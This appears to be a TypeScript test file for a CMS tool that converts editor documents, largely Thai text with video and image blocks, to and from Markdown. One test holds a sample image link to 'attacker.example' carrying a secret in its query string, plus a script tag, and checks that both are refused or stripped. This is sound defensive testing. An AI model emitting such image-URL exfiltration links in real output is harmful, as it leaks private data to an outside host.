import assert from 'node:assert/strict';
import test from 'node:test';

import { documentToMarkdown } from '../../src/server/mcp/markdown-out';
import { markdownToDocument, McpInputError } from '../../src/server/mcp/markdown-in';
import type { EditorDocument } from '../../src/types/cms';

const MEDIA = '55555555-5555-4555-8555-555555555555';
const p = (text: string, marks?: { type: string; attrs?: Record<string, unknown> }[], attrs?: Record<string, unknown>) =>
  ({ type: 'paragraph', ...(attrs ? { attrs } : {}), content: [{ type: 'text', text, ...(marks ? { marks } : {}) }] });
const video = { type: 'video', attrs: { provider: 'youtube', videoId: 'dQw4w9WgXcQ', start: null, title: 'คลิป', mediaId: null } };
const source = {
  type: 'doc',
  content: [
    { type: 'heading', attrs: { level: 2 }, content: [{ type: 'text', text: 'หัวข้อ' }] },
    p('สีแดง', [{ type: 'textColor', attrs: { color: 'red' } }], { textAlign: 'center' }),
    p('ขีดเส้นใต้', [{ type: 'underline' }]),
    video,
    { type: 'image', attrs: { src: `/media/${MEDIA}`, alt: 'รูป', mediaId: MEDIA } },
  ],
} as EditorDocument;

test('reading turns a draft into Markdown, says what it could not show, and stands blocks in as lines', () => {
  const out = documentToMarkdown(source);
  assert.match(out.markdown, /^## หัวข้อ/m);
  assert.match(out.markdown, /^สีแดง$/m);
  assert.doesNotMatch(out.markdown, /\+\+/, 'underline is not written as ++');
  assert.match(out.markdown, /^\{\{tome:block 1\}\}$/m);
  assert.match(out.markdown, new RegExp(`!\\[รูป\\]\\(/media/${MEDIA}\\)`));
  assert.deepEqual(out.blocks, [{ n: 1, kind: 'video', label: 'คลิป' }]);
  assert.deepEqual(out.formattingNotShown, { color: 1, underline: 1, align: 1 });
});

test('writing puts each block line back as the block it stood for', async () => {
  const { markdown } = documentToMarkdown(source);
  const { document } = await markdownToDocument(markdown.replace('หัวข้อ', 'หัวข้อใหม่'), source);
  assert.deepEqual(document.content?.find((node) => node.type === 'video'), video);
  assert.equal(document.content?.[0]?.content?.[0]?.text, 'หัวข้อใหม่');
});

test('an unknown block, a block line in a new draft, and a picture from elsewhere are refused with what to do', async () => {
  await assert.rejects(markdownToDocument('{{tome:block 7}}', source), (error) => error instanceof McpInputError && /block 7/.test(error.message));
  await assert.rejects(markdownToDocument('{{tome:block 1}}', null), (error) => error instanceof McpInputError && /new draft/.test(error.message));
  await assert.rejects(
    markdownToDocument('![x](https://attacker.example/?d=secret)', null),
    (error) => error instanceof McpInputError && /list_media/.test(error.message) && /attacker\.example/.test(error.message),
  );
  await assert.rejects(markdownToDocument('![x](/media/not-a-uuid)', null), McpInputError);
});

test('HTML is removed and said, and a library picture is kept', async () => {
  const { document, warnings } = await markdownToDocument(`ก่อน\n\n<script>x</script>\n\n![a](/media/${MEDIA})`, null);
  assert.deepEqual(document.content?.map((node) => node.type), ['paragraph', 'image']);
  assert.equal(document.content?.[1]?.attrs?.src, `/media/${MEDIA}`);
  assert.ok(warnings.some((warning) => /HTML/.test(warning)));
});

test('a body that starts with a rule keeps its first lines and the rule', async () => {
  const { document } = await markdownToDocument('---\n\ntext', null);
  assert.deepEqual(document.content?.map((node) => node.type), ['horizontalRule', 'paragraph']);
  assert.equal(document.content?.[1]?.content?.[0]?.text, 'text');
});

test('a first heading of level one stays in the body', async () => {
  const { document } = await markdownToDocument('# ใหญ่\n\ntext', null);
  assert.deepEqual(document.content?.map((node) => node.type), ['heading', 'paragraph']);
});

test('a block line inside a list is refused, since the editor cannot hold a block there', async () => {
  await assert.rejects(
    markdownToDocument('- {{tome:block 1}}', source),
    (error) => error instanceof McpInputError && error.message === 'Keep each {{tome:block N}} line on a line of its own, outside lists and quotes, and try again.',
  );
});

test('a block line in a quote, and one on its own, give documents the editor can hold', async () => {
  const quoted = await markdownToDocument('> {{tome:block 1}}', source);
  assert.deepEqual(quoted.document.content?.[0]?.content?.[0], video);
  const alone = await markdownToDocument('text\n\n{{tome:block 1}}', source);
  assert.deepEqual(alone.document.content?.map((node) => node.type), ['paragraph', 'video']);
});
